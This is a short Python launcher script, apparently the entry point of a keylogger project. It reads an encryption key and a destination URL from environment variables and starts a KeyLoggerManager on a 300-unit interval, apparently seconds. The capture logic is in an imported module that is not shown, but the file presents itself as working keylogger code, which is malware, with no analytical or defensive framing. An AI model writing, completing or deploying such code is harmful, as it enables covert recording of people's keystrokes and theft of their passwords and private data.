from os import getenv
from dotenv import load_dotenv
from Manager import KeyLoggerManager

load_dotenv()

encryption_key = getenv('encryption_key')
url = getenv('URL')

manager = KeyLoggerManager(300, encryption_key, url)

if __name__ == '__main__':
    manager.start()